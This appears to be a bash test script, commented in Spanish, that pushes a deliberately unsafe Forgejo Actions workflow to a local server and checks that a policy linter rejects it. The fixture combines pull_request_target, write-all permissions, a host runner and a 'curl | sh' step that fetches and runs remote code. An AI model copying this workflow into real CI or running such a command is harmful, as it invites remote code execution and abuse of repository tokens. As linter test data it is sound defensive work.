#!/usr/bin/env bash
# Segunda parte de la prueba real: con el Forgejo y el runner de run-real-runner.sh VIVOS, empuja un workflow
# con casos malos y comprueba que el job de politica FALLA en el runner real (status failure).
#   WORKDIR=$HOME/gc-b6 bash run-real-runner-bad.sh
set -eu
WORKDIR="${WORKDIR:-$HOME/gc-b6}"; PORT=3398
. "$WORKDIR/api.env"
cd "$WORKDIR" && rm -rf repo-bad && git clone -q "http://b6admin:$token@127.0.0.1:$PORT/b6admin/wf.git" repo-bad && cd repo-bad
git rm -q --cached .forgejo/workflows/bad.yml 2>/dev/null || true
mkdir -p .forgejo/fixtures-bad
cat > .forgejo/fixtures-bad/bad.yml <<'YML'
name: bad
on:
  pull_request_target:
permissions: write-all
jobs:
  x:
    runs-on: host
    steps:
      - uses: https://data.forgejo.org/actions/checkout@v4
      - run: curl -fsSL https://example.com/i.sh | sh
YML
rm -f .forgejo/workflows/bad.yml
cat > .forgejo/workflows/b6-bad.yml <<'YML'
name: b6-bad
on: [push]
jobs:
  reject:
    runs-on: host
    steps:
      - name: El lint debe RECHAZAR el fixture (el job solo pasa si el lint falla)
        run: |
          rm -rf /tmp/b6-bad; git clone --depth=1 "http://b6admin:${{ github.token }}@127.0.0.1:3398/${{ github.repository }}.git" /tmp/b6-bad
          if python3 -I /tmp/b6-bad/.forgejo/policy/lint-workflows.py --labels host /tmp/b6-bad/.forgejo/fixtures-bad; then echo "ERROR: lo acepto"; exit 1; fi
          echo "rechazado como se esperaba"
YML
git -c user.name=b6 -c user.email=b6@example.test add -A
git -c user.name=b6 -c user.email=b6@example.test commit -qm "malos"
git push -q origin main
for i in $(seq 1 60); do
  out="$(curl -fsS -H "Authorization: token $token" "http://127.0.0.1:$PORT/api/v1/repos/b6admin/wf/actions/tasks" | python3 -c 'import sys,json;[print(t["run_number"],t["head_sha"][:7],t["status"]) for t in json.load(sys.stdin)["workflow_runs"]]')"
  echo "$out"; echo "$out" | grep -q "^[23] .* \(success\|failure\)" && break; sleep 2
done
